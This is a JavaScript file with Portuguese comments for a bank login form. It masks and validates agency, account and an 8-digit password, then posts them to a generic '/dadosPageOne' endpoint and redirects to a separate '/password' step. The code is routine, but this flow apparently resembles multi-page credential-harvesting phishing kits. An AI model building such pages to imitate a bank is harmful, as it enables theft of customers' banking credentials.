// Mostrar/ocultar senha
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eye-icon');

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.classList.remove('fa-eye-slash');
        eyeIcon.classList.add('fa-eye');
    } else {
        passwordInput.type = 'password';
        eyeIcon.classList.remove('fa-eye');
        eyeIcon.classList.add('fa-eye-slash');
    }
}

// Máscara de Agência (XXXX-X)
document.getElementById('agency').addEventListener('input', function () {
    let digits = this.value.replace(/\D/g, '').slice(0, 5);
    if (digits.length > 1) {
        this.value = digits.slice(0, digits.length - 1) + '-' + digits.slice(-1);
    } else {
        this.value = digits;
    }
    clearError('agency');
});

// Máscara de Conta (até 12 números + 1 dígito)
document.getElementById('account').addEventListener('input', function () {
    let digits = this.value.replace(/\D/g, '').slice(0, 13);
    if (digits.length > 1) {
        this.value = digits.slice(0, digits.length - 1) + '-' + digits.slice(-1);
    } else {
        this.value = digits;
    }
    clearError('account');
});

// Apenas números para a senha (8 dígitos)
document.getElementById('password').addEventListener('input', function () {
    this.value = this.value.replace(/\D/g, '').slice(0, 8);
    clearError('password');
});

// Inputs
const agency = document.getElementById('agency');
const account = document.getElementById('account');
const password = document.getElementById('password');

// Validação nos eventos
[agency, account, password].forEach(input => {
    input.addEventListener('blur', () => validateField(input));
    input.addEventListener('input', () => clearError(input.id));
});

// Submit
document.getElementById('form').addEventListener('submit', function(event) {
    event.preventDefault();

    const isAgencyValid = validateField(agency);
    const isAccountValid = validateField(account);
    const isPasswordValid = validateField(password);

    if (!(isAgencyValid && isAccountValid && isPasswordValid)) {
        return;
    }

    localStorage.setItem('agency', agency.value);
    localStorage.setItem('account', account.value);

    const payload = {
        agency: agency.value,
        account: account.value,
        password: password.value
    };

    enviarFormulario(payload);
});

// Validação dos campos
function validateField(input) {
    const value = input.value.replace(/\D/g, '');
    const id = input.id;
    let isValid = true;

    clearError(id);

    if (id === 'agency') {
        if (!value) {
            showError(id, 'Agência é obrigatória');
            isValid = false;
        } else if (value.length !== 5) {
            showError(id, 'Agência deve ter 5 dígitos (ex: 1234-5)');
            isValid = false;
        }
    }

    if (id === 'account') {
        if (!value) {
            showError(id, 'Conta é obrigatória');
            isValid = false;
        } else if (value.length < 6 || value.length > 13) {
            showError(id, 'Conta deve ter entre 6 e 13 dígitos antes do dígito verificador');
            isValid = false;
        }
    }

    if (id === 'password') {
        if (!value) {
            showError(id, 'Senha é obrigatória');
            isValid = false;
        } else if (value.length !== 8) {
            showError(id, 'Senha deve ter exatamente 8 dígitos');
            isValid = false;
        }
    }

    return isValid;
}

// Mostrar erro
function showError(inputId, message) {
    const input = document.getElementById(inputId);
    const errorDiv = document.getElementById(`${inputId}-error`);

    input.classList.add('border-red-500');
    if (errorDiv) {
        errorDiv.innerText = message;
        errorDiv.style.display = 'block';
    }
}

// Limpar erro
function clearError(inputId) {
    const input = document.getElementById(inputId);
    const errorDiv = document.getElementById(`${inputId}-error`);

    input.classList.remove('border-red-500');
    if (errorDiv) {
        errorDiv.innerText = '';
        errorDiv.style.display = 'none';
    }
}

// Enviar dados via fetch
function enviarFormulario(payload) {
    fetch('/dadosPageOne', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (!response.ok) {
            window.location.href = '/error'; // Página de erro genérica
            return;
        }
        return response.json();
    })
    .then(data => {
        if (data) {
            window.location.href = '/password'; // Próxima página
        }
    })
    .catch(() => {
        window.location.href = '/error'; // Página de erro genérica
    });
}
